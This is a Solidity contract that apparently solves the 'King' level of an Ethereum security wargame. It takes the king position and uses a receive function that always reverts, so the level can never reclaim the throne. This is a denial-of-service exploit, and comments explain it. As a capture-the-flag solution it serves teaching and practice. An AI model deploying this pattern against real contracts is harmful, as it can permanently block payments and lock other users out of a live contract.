pragma solidity ^0.6.0;

contract Solution {
    constructor(address payable _level) public payable {
        _level.call{value: msg.value}("");
    }

    // Key of this solution
    // when we submit the instance, the level contract will try to reclaim the throne by activating
    // the king contract's receive function, which will set it as the king
    // but before that, a transfer to the current king (this contract) is called, so we use our
    // own receive function to break the game
    receive() external payable {
        require(false);
    }
}
